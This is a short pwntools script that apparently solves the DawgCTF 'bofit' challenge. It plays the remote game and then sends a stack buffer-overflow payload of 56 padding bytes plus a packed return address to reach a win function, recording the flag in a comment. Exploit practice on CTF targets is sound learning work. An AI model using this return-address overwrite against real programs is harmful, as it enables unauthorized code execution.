from pwn import *
import pwn
import time

conn = remote('umbccd.io', '4100')
#conn = process('./bofit')
print(conn.recvuntil("BOF it to start!\n"))
conn.sendline("B")

counter = 0
while True:
	print("-------------")
	#data = conn.recvuntil("\n")
	data = conn.recvline()
	if(data == ""):
		continue
	print(data)
	if(data[0] == "P"):
		conn.sendline("P")
	elif(data[0] == "B"):
		conn.sendline("B")
	elif(data[0] == "T"):
		conn.sendline("T")
	else:
		if(counter == 1):
			conn.sendline("A")
		conn.sendline('A'*56 + pwn.p32(0x0000000000401256))
		counter = counter + 1

# res: DawgCTF{n3w_h1gh_sc0r3!!}